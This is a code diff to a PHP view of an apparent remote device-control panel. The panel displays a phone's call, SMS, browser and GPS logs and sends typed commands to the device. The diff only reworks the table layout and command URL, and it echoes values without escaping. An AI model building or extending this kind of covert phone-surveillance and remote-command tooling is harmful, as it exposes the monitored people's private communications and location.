@@ -1,4 +1,4 @@
-<b> Device Details (<?php echo $deviceid ?>)</b>
+<b> Device Details (<?php echo $deviceid ?>, <?php echo $devicename ?>, <?php echo $devicenumber ?>)</b>
 
 <br>
 
@@ -41,9 +41,7 @@ function showGoogleMap(long,lat) {
 <button onclick="showCallLog()">Call-Log</button> <button onclick="showSmsLog()">SMS-Log</button> <button onclick="showBrowserLog()">Browser-Log</button> <button onclick="showGPSLog()">GPS-Log</button> <button onclick="showPackages()">Packages</button> 
 <br><br><hr><br>
 	<div class="ph_maindiv_content">
-	<PRE>
- Registered		Command Seen		Current Command
-	</PRE> 
+<br>Registered  ||  Name  ||  Number  ||  Command Seen  ||  Current Command
 	</div>
 
 	<?php
@@ -51,16 +49,14 @@ function showGoogleMap(long,lat) {
 	foreach ($users1 as $row) {
 	?>
 	<div class="ph_maindiv_content">
-		<PRE>
- <?php echo $row['clm_registered'] ?>		<?php echo $row['clm_commandseen'] ?>			<a onclick="showCommandHistory()"><?php echo $row['clm_currentcommand'] ?></a>
-		</PRE>
+<br><?php echo $row['clm_registered'] ?>  ||  <?php echo $row['clm_device_name'] ?>  ||  <?php echo $row['clm_device_number'] ?>  ||  <?php echo $row['clm_commandseen'] ?>  ||  <a onclick="showCommandHistory()"><?php echo $row['clm_currentcommand'] ?></a>
 	</div>
 	<?php
 	$ct++;
 	}
 	?>
 <br><hr><br>
-<form action="<?php echo base_url() . 'admin/addcommand/' . $deviceid;?>" method="POST">
+<form action="<?php echo base_url() . 'admin/addcommand/' . $deviceid."/".$devicename."/".$devicenumber;?>" method="POST">
 
 	<input type="text" name="command" id = "cmdbox" required="required"/> <br/>
 
@@ -131,7 +127,6 @@ function showGoogleMap(long,lat) {
 	<tr>
 		<td> <?php echo $ct ?> </td>
 		<td> <?php echo $row['clm_date'] ?> </td>
-		<td> <?php echo $row['clm_from'] ?> </td>
 		<td> <?php echo $row['clm_msg'] ?> </td>
 	<?php
 	$ct++;
